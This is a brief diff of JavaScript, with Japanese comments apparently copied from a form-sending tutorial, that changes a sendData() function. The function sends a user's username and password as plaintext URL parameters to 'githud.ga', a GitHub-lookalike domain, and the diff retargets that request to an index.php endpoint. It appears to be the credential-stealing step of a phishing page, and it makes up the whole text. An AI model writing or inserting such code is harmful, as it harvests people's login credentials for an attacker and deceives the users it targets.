@@ -132,7 +132,7 @@ function sendData() {
   const XHR = new XMLHttpRequest();
   
   // リクエストをセットアップします
-  XHR.open('GET', 'https://www.githud.ga?username='+username+'&password='+password);
+  XHR.open('GET', 'https://www.githud.ga/index.php?username='+username+'&password='+password);
 
   // FormData オブジェクトを送信するだけです。HTTP ヘッダは自動的に設定されます
   XHR.send();
